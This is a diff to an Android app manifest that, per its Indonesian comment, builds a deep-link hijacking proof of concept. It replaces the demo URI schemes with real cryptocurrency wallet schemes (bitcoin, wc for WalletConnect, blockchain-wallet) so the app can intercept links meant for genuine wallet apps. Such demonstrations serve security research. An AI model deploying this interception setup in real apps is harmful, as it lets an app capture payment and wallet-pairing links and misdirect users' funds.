@@ -11,25 +11,30 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.MyApplication">
+
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:launchMode="singleTask"
             android:label="@string/app_name"
             android:theme="@style/Theme.MyApplication">
+
+            <!-- Default Launcher Intent Filter -->
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
 
+            <!-- Intent Filter untuk Deep Link Hijacking PoC -->
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
                 <category android:name="android.intent.category.DEFAULT" />
                 <category android:name="android.intent.category.BROWSABLE" />
-                <data android:scheme="demoapp" />
-                <data android:scheme="mywallet" />
+                <data android:scheme="bitcoin" />
+                <data android:scheme="wc" />
+                <data android:scheme="blockchain-wallet" />
             </intent-filter>
+
         </activity>
     </application>
 
